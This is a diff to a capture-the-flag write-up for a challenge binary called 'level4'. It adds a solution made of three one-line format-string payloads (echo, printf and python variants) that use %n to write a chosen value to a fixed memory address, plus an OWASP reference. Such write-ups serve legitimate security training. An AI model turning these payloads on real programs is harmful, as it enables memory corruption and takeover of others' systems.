@@ -1,4 +1,4 @@
-# level3
+# level4
 
 ## Header
 
@@ -20,6 +20,13 @@ No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RU
 
 ## Solution
 
+The same as level3
 
+echo -n $'\x10\x98\x04\x08%16930112c%12$n' | ./level4
+
+printf '\x10\x98\x04\x08%%16930112c%%12$n' | ./level4
+
+python -c 'print "\x10\x98\x04\x08%16930112c%12$n"' | ./level4
 
 ## References
+https://owasp.org/www-community/attacks/Format_string_attack
